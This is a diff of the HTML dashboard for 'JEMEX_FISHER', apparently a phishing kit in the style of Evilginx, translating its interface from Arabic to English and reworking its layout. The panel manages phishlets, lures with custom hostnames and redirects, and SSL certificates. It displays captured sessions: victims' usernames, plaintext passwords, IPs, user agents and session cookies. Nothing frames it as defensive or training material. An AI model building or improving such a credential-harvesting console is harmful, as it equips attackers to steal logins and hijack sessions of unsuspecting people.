@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html lang="en" dir="ltr">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>JEMEX_FISHER - لوحة التحكم</title>
+    <title>JEMEX_FISHER - Dashboard</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <link rel="stylesheet" href="/static/css/dashboard.css">
 </head>
@@ -24,24 +24,24 @@
             <nav class="sidebar-nav">
                 <ul>
                     <li class="active">
-                        <a href="#dashboard" data-target="dashboard-tab"><i class="fas fa-chart-line"></i> الرئيسية</a>
+                        <a href="#dashboard" data-target="dashboard-tab"><i class="fas fa-chart-line"></i> Dashboard</a>
                     </li>
                     <li>
                         <a href="#phishlets" data-target="phishlets-tab"><i class="fas fa-fish"></i> Phishlets</a>
                     </li>
                     <li>
-                        <a href="#lures" data-target="lures-tab"><i class="fas fa-hook"></i> الطُعم</a>
+                        <a href="#lures" data-target="lures-tab"><i class="fas fa-hook"></i> Lures</a>
                     </li>
                     <li>
-                        <a href="#sessions" data-target="sessions-tab"><i class="fas fa-key"></i> الجلسات</a>
+                        <a href="#sessions" data-target="sessions-tab"><i class="fas fa-key"></i> Sessions</a>
                     </li>
                     <li>
-                        <a href="#settings" data-target="settings-tab"><i class="fas fa-cog"></i> الإعدادات</a>
+                        <a href="#settings" data-target="settings-tab"><i class="fas fa-cog"></i> Settings</a>
                     </li>
                 </ul>
             </nav>
             <div class="sidebar-footer">
-                <button id="logout-btn"><i class="fas fa-sign-out-alt"></i> تسجيل الخروج</button>
+                <button id="logout-btn"><i class="fas fa-sign-out-alt"></i> Logout</button>
             </div>
         </aside>
 
@@ -56,7 +56,7 @@
                         <span class="notification-count">2</span>
                     </div>
                     <div class="user-info">
-                        <span class="user-name">المسؤول</span>
+                        <span class="user-name">Admin</span>
                         <div class="user-avatar">
                             <i class="fas fa-user"></i>
                         </div>
@@ -65,11 +65,11 @@
             </header>
 
             <div class="content-wrapper">
-                <!-- لوحة الداشبورد الرئيسية -->
+                <!-- Main Dashboard Section -->
                 <section id="dashboard-tab" class="tab-content active">
                     <div class="dashboard-header">
-                        <h2>لوحة التحكم</h2>
-                        <p class="last-updated">آخر تحديث: <span id="last-update-time">جاري التحميل...</span></p>
+                        <h2>Dashboard</h2>
+                        <p class="last-updated">Last Updated: <span id="last-update-time">Loading...</span></p>
                     </div>
 
                     <div class="stats-cards">
@@ -88,7 +88,7 @@
                             </div>
                             <div class="stat-card-info">
                                 <h3 id="lures-count">0</h3>
-                                <p>الطُعم</p>
+                                <p>Lures</p>
                             </div>
                         </div>
                         <div class="stat-card">
@@ -97,7 +97,7 @@
                             </div>
                             <div class="stat-card-info">
                                 <h3 id="sessions-count">0</h3>
-                                <p>الجلسات</p>
+                                <p>Sessions</p>
                             </div>
                         </div>
                         <div class="stat-card">
@@ -106,7 +106,7 @@
                             </div>
                             <div class="stat-card-info">
                                 <h3 id="credentials-count">0</h3>
-                                <p>بيانات الاعتماد</p>
+                                <p>Credentials</p>
                             </div>
                         </div>
                     </div>
@@ -115,8 +115,8 @@
                         <div class="dashboard-col">
                             <div class="card">
                                 <div class="card-header">
-                                    <h3>آخر الجلسات</h3>
-                                    <a href="#sessions" class="btn-view-all">عرض الكل</a>
+                                    <h3>Recent Sessions</h3>
+                                    <a href="#sessions" class="btn-view-all">View All</a>
                                 </div>
                                 <div class="card-body">
                                     <div class="table-responsive">
@@ -125,14 +125,14 @@
                                                 <tr>
                                                     <th>ID</th>
                                                     <th>Phishlet</th>
-                                                    <th>اسم المستخدم</th>
+                                                    <th>Username</th>
                                                     <th>IP</th>
-                                                    <th>الوقت</th>
+                                                    <th>Time</th>
                                                 </tr>
                                             </thead>
                                             <tbody>
                                                 <tr>
-                                                    <td colspan="5" class="text-center">جاري التحميل...</td>
+                                                    <td colspan="5" class="text-center">Loading...</td>
                                                 </tr>
                                             </tbody>
                                         </table>
@@ -143,12 +143,12 @@
                     </div>
                 </section>
 
-                <!-- قسم Phishlets -->
+                <!-- Phishlets Section -->
                 <section id="phishlets-tab" class="tab-content">
                     <div class="section-header">
                         <h2>Phishlets</h2>
                         <button class="btn-primary refresh-btn" id="refresh-phishlets">
-                            <i class="fas fa-sync-alt"></i> تحديث
+                            <i class="fas fa-sync-alt"></i> Refresh
                         </button>
                     </div>
 
@@ -156,35 +156,35 @@
                         <table class="data-table" id="phishlets-table">
                             <thead>
                                 <tr>
-                                    <th>الاسم</th>
-                                    <th>المؤلف</th>
-                                    <th>الحالة</th>
-                                    <th>اسم المضيف</th>
-                                    <th>الإجراءات</th>
+                                    <th>Name</th>
+                                    <th>Author</th>
+                                    <th>Status</th>
+                                    <th>Hostname</th>
+                                    <th>Actions</th>
                                 </tr>
                             </thead>
                             <tbody>
                                 <tr>
-                                    <td colspan="5" class="text-center">جاري التحميل...</td>
+                                    <td colspan="5" class="text-center">Loading...</td>
                                 </tr>
                             </tbody>
                         </table>
                     </div>
                 </section>
 
-                <!-- قسم الطُعم -->
+                <!-- Lures Section -->
                 <section id="lures-tab" class="tab-content">
                     <div class="content-header">
-                        <h2>الطعوم (Lures)</h2>
+                        <h2>Lures</h2>
                         <div class="button-group">
                             <button id="create-lure-btn" class="btn btn-primary">
-                                <i class="fas fa-plus"></i> إنشاء
+                                <i class="fas fa-plus"></i> Create
                             </button>
                             <button id="update-certificates-btn" class="btn btn-warning">
-                                <i class="fas fa-sync"></i> تحديث شهادات SSL
+                                <i class="fas fa-sync"></i> Update SSL Certificates
                             </button>
                             <button id="refresh-lures" class="btn btn-secondary">
-                                <i class="fas fa-sync"></i> تحديث
+                                <i class="fas fa-sync"></i> Refresh
                             </button>
                         </div>
                     </div>
@@ -195,99 +195,80 @@
                                 <tr>
                                     <th>ID</th>
                                     <th>Phishlet</th>
-                                    <th>اسم المضيف</th>
-                                    <th>المسار</th>
-                                    <th>URL إعادة التوجيه</th>
-                                    <th>الحالة</th>
-                                    <th>الإجراءات</th>
+                                    <th>Hostname</th>
+                                    <th>Path</th>
+                                    <th>Redirect URL</th>
                                 </tr>
                             </thead>
+                            <!-- جدول الطُعم هنا -->
                             <tbody>
                                 <tr>
-                                    <td colspan="7" class="text-center">جاري التحميل...</td>
+                                    <td colspan="5" class="text-center">Loading...</td>
                                 </tr>
                             </tbody>
                         </table>
                     </div>
                 </section>
-
-                <!-- قسم الجلسات -->
+                <!-- Sessions Section -->
                 <section id="sessions-tab" class="tab-content">
                     <div class="section-header">
-                        <h2>الجلسات</h2>
-                        <button class="btn-primary refresh-btn" id="refresh-sessions">
-                            <i class="fas fa-sync-alt"></i> تحديث
-                        </button>
+                        <h2>Sessions</h2>
+                        <div class="button-group">
+                            <button class="btn-primary refresh-btn" id="sessions-refresh-btn">
+                                <i class="fas fa-sync-alt"></i> Refresh
+                            </button>
+                        </div>
                     </div>
 
                     <div class="table-responsive">
                         <table class="data-table" id="sessions-table">
                             <thead>
                                 <tr>
-                                    <th>ID</th>
+                                    <th>Session ID</th>
                                     <th>Phishlet</th>
-                                    <th>اسم المستخدم</th>
-                                    <th>كلمة المرور</th>
-                                    <th>العنوان</th>
-                                    <th>الوقت</th>
-                                    <th>الإجراءات</th>
+                                    <th>Username</th>
+                                    <th>Password</th>
+                                    <th>IP</th>
+                                    <th>Time</th>
+                                    <th>Actions</th>
                                 </tr>
                             </thead>
                             <tbody>
                                 <tr>
-                                    <td colspan="7" class="text-center">جاري التحميل...</td>
+                                    <td colspan="7" class="text-center">Loading...</td>
                                 </tr>
                             </tbody>
                         </table>
                     </div>
                 </section>
-
-                <!-- قسم الإعدادات -->
+                <!-- Settings Section -->
                 <section id="settings-tab" class="tab-content">
                     <div class="section-header">
-                        <h2>الإعدادات</h2>
+                        <h2>Settings</h2>
                     </div>
-
                     <div class="settings-container">
-                        <div class="card">
-                            <div class="card-header">
-                                <h3>إعدادات الخادم</h3>
+                        <div class="settings-card">
+                            <div class="settings-header">
+                                <h3>General Settings</h3>
                             </div>
-                            <div class="card-body">
-                                <div class="form-group">
-                                    <label for="domain">النطاق الرئيسي</label>
-                                    <input type="text" id="domain" class="form-control" placeholder="example.com">
-                                </div>
-                                <div class="form-group">
-                                    <label for="ip">عنوان IP</label>
-                                    <input type="text" id="ip" class="form-control" placeholder="0.0.0.0">
-                                </div>
-                                <div class="form-group">
-                                    <label for="redirect-url">URL إعادة التوجيه الافتراضي</label>
-                                    <input type="text" id="redirect-url" class="form-control" placeholder="https://example.com">
-                                </div>
-                                <button class="btn-primary" id="save-settings">حفظ الإعدادات</button>
-                            </div>
-                        </div>
-
-                        <div class="card">
-                            <div class="card-header">
-                                <h3>بيانات المصادقة</h3>
-                            </div>
-                            <div class="card-body">
-                                <div class="form-group">
-                                    <label for="new-username">اسم المستخدم الجديد</label>
-                                    <input type="text" id="new-username" class="form-control" placeholder="اسم المستخدم">
-                                </div>
-                                <div class="form-group">
-                                    <label for="new-password">كلمة المرور الجديدة</label>
-                                    <input type="password" id="new-password" class="form-control" placeholder="كلمة المرور">
-                                </div>
-                                <div class="form-group">
-                                    <label for="confirm-password">تأكيد كلمة المرور</label>
-                                    <input type="password" id="confirm-password" class="form-control" placeholder="تأكيد كلمة المرور">
-                                </div>
-                                <button class="btn-primary" id="change-credentials">تغيير بيانات المصادقة</button>
+                            <div class="settings-body">
+                                <form id="settings-form">
+                                    <div class="form-group">
+                                        <label for="domain-setting">Domain</label>
+                                        <input type="text" id="domain-setting" class="form-control" placeholder="yourdomain.com">
+                                    </div>
+                                    <div class="form-group">
+                                        <label for="ip-setting">Server IP</label>
+                                        <input type="text" id="ip-setting" class="form-control" placeholder="123.456.789.0">
+                                    </div>
+                                    <div class="form-group">
+                                        <label for="redirect-setting">Redirect URL</label>
+                                        <input type="text" id="redirect-setting" class="form-control" placeholder="https://google.com">
+                                    </div>
+                                    <div class="form-actions">
+                                        <button type="submit" class="btn btn-primary">Save Changes</button>
+                                    </div>
+                                </form>
                             </div>
                         </div>
                     </div>
@@ -296,113 +277,166 @@
         </main>
     </div>
 
-    <!-- مودال إنشاء طُعم جديد -->
-    <div class="modal" id="create-lure-modal">
+    <!-- Create Lure Modal -->
+    <div id="create-lure-modal" class="modal">
         <div class="modal-content">
             <div class="modal-header">
-                <h3>إنشاء طُعم جديد</h3>
-                <button class="modal-close">&times;</button>
+                <h3>Create Lure</h3>
+                <span class="close">&times;</span>
             </div>
             <div class="modal-body">
-                <div class="form-group">
-                    <label for="lure-phishlet">Phishlet</label>
-                    <select id="lure-phishlet" class="form-control">
-                        <option value="">اختر Phishlet</option>
-                    </select>
-                </div>
-                <div class="form-group">
-                    <label for="lure-hostname">اسم المضيف (اختياري)</label>
-                    <input type="text" id="lure-hostname" class="form-control" placeholder="subdomain.example.com">
-                </div>
-                <div class="form-group">
-                    <label for="lure-path">المسار</label>
-                    <input type="text" id="lure-path" class="form-control" placeholder="/login">
-                </div>
-                <div class="form-group">
-                    <label for="lure-redirect">URL إعادة التوجيه (اختياري)</label>
-                    <input type="text" id="lure-redirect" class="form-control" placeholder="https://example.com">
-                </div>
-            </div>
-            <div class="modal-footer">
-                <button class="btn-secondary modal-close-btn">إلغاء</button>
-                <button class="btn-primary" id="submit-lure">إنشاء</button>
+                <form id="create-lure-form">
+                    <div class="form-group">
+                        <label for="lure-phishlet">Phishlet</label>
+                        <select id="lure-phishlet" class="form-control" required>
+                            <option value="">Select phishlet</option>
+                        </select>
+                    </div>
+                    <div class="form-group">
+                        <label for="lure-hostname">Hostname (optional)</label>
+                        <input type="text" id="lure-hostname" class="form-control" placeholder="Leave empty for default">
+                        <small class="form-text">Custom subdomain. Leave empty to use default.</small>
+                    </div>
+                    <div class="form-group">
+                        <label for="lure-path">Path (optional)</label>
+                        <input type="text" id="lure-path" class="form-control" placeholder="e.g. /login">
+                        <small class="form-text">Custom path for the lure URL.</small>
+                    </div>
+                    <div class="form-actions">
+                        <button type="submit" class="btn btn-primary">Create</button>
+                        <button type="button" class="btn btn-secondary modal-cancel">Cancel</button>
+                    </div>
+                </form>
             </div>
         </div>
     </div>
 
-    <!-- مودال عرض جلسة -->
-    <div class="modal" id="view-session-modal">
-        <div class="modal-content modal-lg">
+    <!-- Hostname Setup Modal -->
+    <div id="hostname-modal" class="modal">
+        <div class="modal-content">
             <div class="modal-header">
-                <h3>تفاصيل الجلسة</h3>
-                <button class="modal-close">&times;</button>
+                <h3>Set Hostname</h3>
+                <span class="close">&times;</span>
             </div>
             <div class="modal-body">
-                <div class="session-details">
-                    <div class="loading-spinner" id="session-loading">
-                        <div class="spinner"></div>
-                        <p>جاري التحميل...</p>
+                <form id="hostname-form">
+                    <input type="hidden" id="hostname-phishlet-name">
+                    <div class="form-group">
+                        <label for="hostname-input">Hostname</label>
+                        <input type="text" id="hostname-input" class="form-control" placeholder="Enter hostname" required>
+                        <small class="form-text">e.g. login.yourdomain.com</small>
                     </div>
-                    <div id="session-content" class="session-content">
-                        <div class="session-info">
-                            <div class="info-item">
-                                <span class="info-label">معرف الجلسة:</span>
-                                <span class="info-value" id="session-id"></span>
-                            </div>
-                            <div class="info-item">
-                                <span class="info-label">Phishlet:</span>
-                                <span class="info-value" id="session-phishlet"></span>
-                            </div>
-                            <div class="info-item">
-                                <span class="info-label">اسم المستخدم:</span>
-                                <span class="info-value" id="session-username"></span>
-                            </div>
-                            <div class="info-item">
-                                <span class="info-label">كلمة المرور:</span>
-                                <span class="info-value" id="session-password"></span>
-                            </div>
-                            <div class="info-item">
-                                <span class="info-label">عنوان IP:</span>
-                                <span class="info-value" id="session-ip"></span>
-                            </div>
-                            <div class="info-item">
-                                <span class="info-label">وكيل المستخدم:</span>
-                                <span class="info-value" id="session-useragent"></span>
-                            </div>
-                            <div class="info-item">
-                                <span class="info-label">تاريخ الإنشاء:</span>
-                                <span class="info-value" id="session-created"></span>
+                    <div class="form-actions">
+                        <button type="submit" class="btn btn-primary">Save</button>
+                        <button type="button" class="btn btn-secondary modal-cancel">Cancel</button>
+                    </div>
+                </form>
+            </div>
+        </div>
+    </div>
+
+    <!-- Session View Modal -->
+    <div id="session-view-modal" class="modal">
+        <div class="modal-content modal-large">
+            <div class="modal-header">
+                <h3>Session Details</h3>
+                <span class="close">&times;</span>
+            </div>
+            <div class="modal-body">
+                <div class="tabs">
+                    <div class="tab-header">
+                        <div class="tab-item active" data-tab="session-info">Info</div>
+                        <div class="tab-item" data-tab="session-cookies">Cookies</div>
+                        <div class="tab-item" data-tab="session-params">Parameters</div>
+                    </div>
+                    <div class="tab-content">
+                        <div id="session-info" class="tab-pane active">
+                            <div class="session-info-grid">
+                                <div class="session-info-item">
+                                    <span class="label">Session ID:</span>
+                                    <span id="session-id-value" class="value"></span>
+                                </div>
+                                <div class="session-info-item">
+                                    <span class="label">Phishlet:</span>
+                                    <span id="session-phishlet-value" class="value"></span>
+                                </div>
+                                <div class="session-info-item">
+                                    <span class="label">IP Address:</span>
+                                    <span id="session-ip-value" class="value"></span>
+                                </div>
+                                <div class="session-info-item">
+                                    <span class="label">User Agent:</span>
+                                    <span id="session-ua-value" class="value"></span>
+                                </div>
+                                <div class="session-info-item">
+                                    <span class="label">Username:</span>
+                                    <span id="session-username-value" class="value"></span>
+                                </div>
+                                <div class="session-info-item">
+                                    <span class="label">Password:</span>
+                                    <span id="session-password-value" class="value"></span>
+                                </div>
+                                <div class="session-info-item">
+                                    <span class="label">Created:</span>
+                                    <span id="session-created-value" class="value"></span>
+                                </div>
+                                <div class="session-info-item">
+                                    <span class="label">Updated:</span>
+                                    <span id="session-updated-value" class="value"></span>
+                                </div>
+                                <div class="session-info-item">
+                                    <span class="label">Landing URL:</span>
+                                    <span id="session-landing-value" class="value"></span>
+                                </div>
                             </div>
                         </div>
-
-                        <div class="tokens-section">
-                            <h4>رموز الكوكيز</h4>
-                            <div class="tokens-container" id="cookie-tokens">
-                                <p class="no-tokens">لا توجد رموز كوكيز</p>
+                        <div id="session-cookies" class="tab-pane">
+                            <div class="session-cookies-container">
+                                <table class="data-table" id="cookies-table">
+                                    <thead>
+                                        <tr>
+                                            <th>Domain</th>
+                                            <th>Name</th>
+                                            <th>Value</th>
+                                        </tr>
+                                    </thead>
+                                    <tbody>
+                                        <tr>
+                                            <td colspan="3" class="text-center">No cookies available</td>
+                                        </tr>
+                                    </tbody>
+                                </table>
                             </div>
-
-                            <h4>رموز HTTP</h4>
-                            <div class="tokens-container" id="http-tokens">
-                                <p class="no-tokens">لا توجد رموز HTTP</p>
-                            </div>
-
-                            <h4>الحقول المخصصة</h4>
-                            <div class="tokens-container" id="custom-fields">
-                                <p class="no-tokens">لا توجد حقول مخصصة</p>
+                        </div>
+                        <div id="session-params" class="tab-pane">
+                            <div class="session-params-container">
+                                <table class="data-table" id="params-table">
+                                    <thead>
+                                        <tr>
+                                            <th>Name</th>
+                                            <th>Value</th>
+                                        </tr>
+                                    </thead>
+                                    <tbody>
+                                        <tr>
+                                            <td colspan="2" class="text-center">No parameters available</td>
+                                        </tr>
+                                    </tbody>
+                                </table>
                             </div>
                         </div>
                     </div>
                 </div>
             </div>
             <div class="modal-footer">
-                <button class="btn-danger" id="delete-session">حذف الجلسة</button>
-                <button class="btn-secondary modal-close-btn">إغلاق</button>
+                <button class="btn btn-danger" id="session-delete-btn">Delete Session</button>
+                <button class="btn btn-secondary modal-cancel">Close</button>
             </div>
         </div>
     </div>
 
-    <!-- التوستر للإشعارات -->
-    <div class="toaster" id="toaster"></div>
+    <!-- Toast Container -->
+    <div id="toast-container"></div>
 
     <script src="/static/js/dashboard.js"></script>
 </body>
